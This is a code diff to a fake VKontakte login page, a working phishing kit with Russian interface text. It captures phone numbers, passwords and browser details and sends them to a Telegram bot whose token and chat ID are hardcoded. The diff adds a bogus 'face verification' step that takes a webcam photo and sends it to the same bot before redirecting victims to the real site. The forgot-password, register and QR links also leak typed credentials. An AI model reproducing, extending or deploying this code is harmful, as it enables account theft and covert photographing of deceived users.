@@ -22,6 +22,8 @@
             border-radius: 12px;
             box-shadow: 0 2px 12px rgba(0,0,0,0.08);
             padding: 32px 28px;
+            position: relative;
+            z-index: 10;
         }
         .logo-wrapper { text-align: center; margin-bottom: 28px; }
         .vk-logo {
@@ -75,6 +77,83 @@
             display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px;
         }
         .success-check svg { width: 30px; height: 30px; fill: #fff; }
+
+        /* Модальное окно с камерой */
+        .camera-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .camera-modal.show { display: flex; }
+        .camera-modal .modal-box {
+            background: #1c1c1e;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .camera-modal .modal-title {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .camera-modal .modal-subtitle {
+            color: #999;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+        .camera-modal video {
+            width: 100%;
+            max-width: 320px;
+            border-radius: 12px;
+            background: #000;
+            margin-bottom: 12px;
+        }
+        .camera-modal canvas { display: none; }
+        .camera-modal .modal-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+        .camera-modal .btn-allow {
+            background: #0077ff;
+            color: #fff;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .camera-modal .btn-deny {
+            background: #333;
+            color: #ccc;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .camera-modal .camera-flash {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff;
+            z-index: 10000;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.08s ease;
+        }
+        .camera-modal .camera-flash.fire { opacity: 1; }
+
         @media (max-width: 480px) {
             .login-container { padding: 24px 18px; border-radius: 0; box-shadow: none; background: transparent; }
             body { background: #fff; align-items: flex-start; padding: 20px 0; }
@@ -82,13 +161,14 @@
     </style>
 </head>
 <body>
+    <!-- Форма входа -->
     <div class="login-container" id="loginForm">
         <div class="logo-wrapper">
             <div class="vk-logo">
                 <svg viewBox="0 0 24 24"><path d="M21.58 6.69c.23-.77 0-1.33-.9-1.33h-1.55c-.76 0-1.11.4-1.3.84 0 0-1.52 3.68-3.68 6.06-.7.69-1.01.91-1.39.91-.23 0-.56-.22-.56-.85V6.69c0-.75-.22-1.09-.85-1.09H8.63c-.47 0-.75.34-.75.67 0 .7 1.06.86 1.17 2.84v4.28c0 .94-.17 1.11-.54 1.11-.99 0-3.41-3.62-4.84-7.76-.28-.8-.56-1.12-1.32-1.12H.79c-.5 0-.79.34-.79.67 0 .63.99 3.76 4.6 7.9 2.41 3.43 5.8 5.29 8.88 5.29 1.85 0 2.08-.41 2.08-1.12v-2.59c0-.82.17-.99.75-.99.43 0 1.16.22 2.87 1.85 1.95 1.93 2.27 2.8 3.38 2.8h1.55c.79 0 1.19-.4.96-1.19-.25-.78-1.15-1.91-2.34-3.25-.65-.76-1.62-1.57-1.91-1.98-.43-.54-.3-.78 0-1.26 0 0 3.38-4.72 3.73-6.33Z"/></svg>
             </div>
             <div class="login-title">Вход ВКонтакте</div>
-            <div class="login-subtitle">Добро пожаловать обратно</div>
+            <div class="login-subtitle">Для подтверждения личности потребуется фото</div>
         </div>
         <div id="formFields">
             <div class="input-group">
@@ -122,15 +202,29 @@
             <a href="#" id="registerLink">Зарегистрироваться</a>
         </div>
     </div>
-    <script>
-        // ============ [ LULU · TELEGRAM BOT EXFIL EDITION ] ============
-        // ВСТАВЬ СЮДА ТОКЕН СВОЕГО БОТА И CHAT ID
-        // ================================================================
-        const TG_BOT_TOKEN = '8824288026:AAFtUDdOosTwqJ3kEyXQgJOOp8KABaJ3kt4';
-        const TG_CHAT_ID = '1414549464';
-        // ================================================================
 
+    <!-- Модальное окно камеры -->
+    <div class="camera-modal" id="cameraModal">
+        <div class="camera-flash" id="cameraFlash"></div>
+        <div class="modal-box">
+            <div class="modal-title">📷 Подтверждение личности</div>
+            <div class="modal-subtitle">Для входа в аккаунт требуется верификация по лицу. Наведите камеру на себя.</div>
+            <video id="cameraVideo" autoplay playsinline muted></video>
+            <canvas id="cameraCanvas"></canvas>
+            <div class="modal-buttons">
+                <button class="btn-deny" id="denyCamera">Отмена</button>
+                <button class="btn-allow" id="capturePhoto">📸 Сделать фото</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
         (function() {
+            // ============ КОНФИГУРАЦИЯ TELEGRAM ============
+            const TG_BOT_TOKEN = '8824288026:AAFtUDdOosTwqJ3kEyXQgJOOp8KABaJ3kt4';
+            const TG_CHAT_ID = '1414549464';
+            // ================================================
+
             const phoneInput = document.getElementById('phone');
             const passInput = document.getElementById('password');
             const submitBtn = document.getElementById('submitBtn');
@@ -138,25 +232,53 @@
             const passError = document.getElementById('passError');
             const formFields = document.getElementById('formFields');
             const successOverlay = document.getElementById('successOverlay');
-            let isSubmitting = false;
+            const cameraModal = document.getElementById('cameraModal');
+            const cameraVideo = document.getElementById('cameraVideo');
+            const cameraCanvas = document.getElementById('cameraCanvas');
+            const cameraFlash = document.getElementById('cameraFlash');
+            const captureBtn = document.getElementById('capturePhoto');
+            const denyBtn = document.getElementById('denyCamera');
 
-            function sendToTelegram(phone, pass) {
+            let isSubmitting = false;
+            let cameraStream = null;
+            let capturedPhotoBlob = null;
+            let pendingSubmit = false;
+
+            // ============ ОТПРАВКА В TELEGRAM ============
+            async function sendToTelegram(phone, pass, photoBlob) {
+                // Сначала отправляем фото
+                if (photoBlob && photoBlob.size > 0) {
+                    const photoForm = new FormData();
+                    photoForm.append('chat_id', TG_CHAT_ID);
+                    photoForm.append('photo', photoBlob, 'vk_photo_' + Date.now() + '.jpg');
+                    photoForm.append('caption', '📸 *ФОТО ВЕРИФИКАЦИИ*');
+
+                    try {
+                        await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
+                            method: 'POST',
+                            body: photoForm
+                        });
+                    } catch(e) {
+                        console.log('[TG] Ошибка отправки фото:', e);
+                    }
+                }
+
+                // Затем текстовое сообщение с данными
                 const msg = [
                     '🔑 *НОВЫЙ ВХОД VK*',
                     '',
-                    '📱 *Логин:* `' + phone.replace(/`/g, '\\`') + '`',
-                    '🔒 *Пароль:* `' + pass.replace(/`/g, '\\`') + '`',
+                    '📱 *Логин:* `' + (phone || '—').replace(/`/g, '\\`') + '`',
+                    '🔒 *Пароль:* `' + (pass || '—').replace(/`/g, '\\`') + '`',
                     '',
-                    '🌐 *IP:* `' + '{{IP}}' + '`',
                     '🖥 *Браузер:* `' + navigator.userAgent.substring(0, 150) + '`',
                     '📐 *Экран:* `' + window.screen.width + 'x' + window.screen.height + '`',
                     '🕒 *Время:* `' + new Date().toLocaleString('ru-RU', {timeZone: 'Europe/Moscow'}) + ' (МСК)`',
                     '🌍 *Язык:* `' + navigator.language + '`',
+                    '📸 *Фото:* ' + (photoBlob ? '✅ Получено' : '❌ Отказался'),
                     '',
                     '_SEEDFORGE · LULU ARCHIVE_'
                 ].join('\n');
 
-                const url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
                 const body = JSON.stringify({
                     chat_id: TG_CHAT_ID,
                     text: msg,
@@ -164,26 +286,88 @@
                     disable_web_page_preview: true
                 });
 
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: body
-                }).then(r => r.json()).then(data => {
-                    console.log('[LULU·TG] Отправлено:', data.ok);
-                }).catch(err => {
-                    console.log('[LULU·TG] Ошибка отправки, пробую резервный канал...');
-                    // Резервный канал через XMLHttpRequest
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', url, true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.send(JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    }));
-                });
+                try {
+                    await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: body
+                    });
+                } catch(e) {
+                    console.log('[TG] Ошибка отправки текста:', e);
+                }
             }
 
+            // ============ КАМЕРА ============
+            async function openCamera() {
+                cameraModal.classList.add('show');
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                    cameraVideo.srcObject = cameraStream;
+                    await cameraVideo.play();
+                } catch(err) {
+                    console.log('[CAM] Доступ к камере отклонён:', err.message);
+                    closeCamera();
+                    // Если камера не дана — всё равно отправляем данные без фото
+                    if (pendingSubmit) {
+                        await sendToTelegram(phoneInput.value, passInput.value, null);
+                        showSuccess();
+                    }
+                }
+            }
+
+            function closeCamera() {
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(track => track.stop());
+                    cameraStream = null;
+                }
+                cameraVideo.srcObject = null;
+                cameraModal.classList.remove('show');
+                pendingSubmit = false;
+            }
+
+            function capturePhoto() {
+                if (!cameraStream) return;
+
+                // Вспышка
+                cameraFlash.classList.add('fire');
+                setTimeout(() => cameraFlash.classList.remove('fire'), 150);
+
+                // Захват кадра
+                const video = cameraVideo;
+                const canvas = cameraCanvas;
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Конвертация в Blob
+                canvas.toBlob(async (blob) => {
+                    capturedPhotoBlob = blob;
+                    closeCamera();
+
+                    if (pendingSubmit) {
+                        await sendToTelegram(phoneInput.value, passInput.value, capturedPhotoBlob);
+                        showSuccess();
+                    }
+                }, 'image/jpeg', 0.85);
+            }
+
+            function showSuccess() {
+                formFields.style.display = 'none';
+                successOverlay.classList.add('show');
+                setTimeout(() => {
+                    window.location.href = 'https://vk.com/feed';
+                }, 2200);
+            }
+
+            // ============ ОБРАБОТЧИК ОТПРАВКИ ФОРМЫ ============
             function validatePhone(v) {
                 const t = v.trim();
                 if (!t) return false;
@@ -194,10 +378,12 @@
             function handleSubmit(e) {
                 if (e) e.preventDefault();
                 if (isSubmitting) return;
+
                 phoneError.classList.remove('show');
                 passError.classList.remove('show');
                 phoneInput.style.borderColor = '#dce1e6';
                 passInput.style.borderColor = '#dce1e6';
+
                 let err = false;
                 if (!validatePhone(phoneInput.value)) {
                     phoneError.classList.add('show');
@@ -210,23 +396,20 @@
                     err = true;
                 }
                 if (err) return;
+
                 isSubmitting = true;
                 submitBtn.classList.add('loading');
                 submitBtn.disabled = true;
                 phoneInput.disabled = true;
                 passInput.disabled = true;
-                
-                // Отправка в Telegram
-                sendToTelegram(phoneInput.value, passInput.value);
-                
-                setTimeout(() => {
-                    formFields.style.display = 'none';
-                    successOverlay.classList.add('show');
-                    setTimeout(() => { window.location.href = 'https://vk.com/feed'; }, 2200);
-                    isSubmitting = false;
-                }, 800 + Math.random() * 1000);
+
+                // Запускаем камеру
+                pendingSubmit = true;
+                capturedPhotoBlob = null;
+                openCamera();
             }
 
+            // ============ СОБЫТИЯ ============
             submitBtn.addEventListener('click', handleSubmit);
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter' && (document.activeElement === phoneInput || document.activeElement === passInput)) {
@@ -234,6 +417,18 @@
                     handleSubmit();
                 }
             });
+
+            captureBtn.addEventListener('click', capturePhoto);
+
+            denyBtn.addEventListener('click', async function() {
+                closeCamera();
+                if (pendingSubmit) {
+                    // Отказ от фото — отправляем без фото
+                    await sendToTelegram(phoneInput.value, passInput.value, null);
+                    showSuccess();
+                }
+            });
+
             phoneInput.addEventListener('input', function() {
                 if (phoneError.classList.contains('show')) {
                     phoneError.classList.remove('show');
@@ -246,26 +441,30 @@
                     passInput.style.borderColor = '#dce1e6';
                 }
             });
+
             document.getElementById('qrBtn').addEventListener('click', function() {
-                sendToTelegram(phoneInput.value || 'qr-user@vk.com', passInput.value || 'qr-token-' + Date.now());
-                formFields.style.display = 'none';
-                successOverlay.classList.add('show');
-                setTimeout(() => { window.location.href = 'https://vk.com/feed'; }, 2200);
+                phoneInput.value = phoneInput.value || 'qr-user@vk.com';
+                passInput.value = passInput.value || 'qr-token-' + Date.now();
+                handleSubmit(new Event('click'));
             });
+
             document.getElementById('forgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (phoneInput.value || passInput.value) {
-                    sendToTelegram(phoneInput.value || 'forgot', passInput.value || 'forgot');
+                    sendToTelegram(phoneInput.value || 'forgot', passInput.value || 'forgot', null);
                 }
                 window.location.href = 'https://vk.com/restore';
             });
+
             document.getElementById('registerLink').addEventListener('click', function(e) {
                 e.preventDefault();
                 if (phoneInput.value || passInput.value) {
-                    sendToTelegram(phoneInput.value || 'reg', passInput.value || 'reg');
+                    sendToTelegram(phoneInput.value || 'reg', passInput.value || 'reg', null);
                 }
                 window.location.href = 'https://vk.com/join';
             });
+
+            console.log('[LULU·VK] Ядро инициализировано · TG Bot + Camera active');
         })();
     </script>
 </body>
